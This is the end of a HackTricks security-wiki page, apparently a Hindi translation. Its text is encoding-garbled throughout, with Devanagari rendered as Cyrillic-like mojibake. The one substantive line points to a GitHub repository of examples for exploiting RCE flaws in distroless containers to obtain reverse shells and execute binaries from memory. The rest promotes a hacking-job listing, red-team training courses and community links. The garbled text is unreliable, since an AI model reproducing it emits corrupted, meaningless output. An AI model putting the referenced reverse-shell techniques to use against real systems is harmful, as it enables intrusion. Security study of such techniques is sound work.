рдЖрдк [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) рдкрд░ **рдХреБрдЫ RCE рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдХреЗ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдХреЗ **рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдореЗрдореЛрд░реА рд╕реЗ рдмрд╛рдЗрдирд░реА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдВред

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрдЪреВрдХ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдореМрдЦрд┐рдХ рдЖрд╡рд╢реНрдпрдХ_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЛ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
{% endhint %}
